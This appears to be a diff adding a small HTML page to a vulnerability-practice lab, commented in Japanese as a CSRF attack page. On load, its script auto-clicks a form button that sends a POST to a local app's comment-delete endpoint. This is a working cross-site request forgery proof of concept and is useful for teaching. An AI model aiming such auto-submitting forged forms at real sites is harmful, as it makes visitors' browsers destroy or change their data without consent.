@@ -1,0 +1,27 @@
+<!-- Development/vuln-lab の CSRF 攻撃用のページ -->
+
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <meta charset="UTF-8">
+
+    <script>
+        window.onload = function () {
+            const button = document.getElementById("attack-button");
+            button.click();
+        };
+    </script>
+
+</head>
+
+<body>
+
+    この下にCSRF攻撃フォームがある。
+    <form action="http://localhost:3000/comments/2/delete" method="post">
+        <input id="attack-button" type="submit" visible="hidden" value="CSRF攻撃を実行する">
+    </form>
+
+</body>
+
+</html>
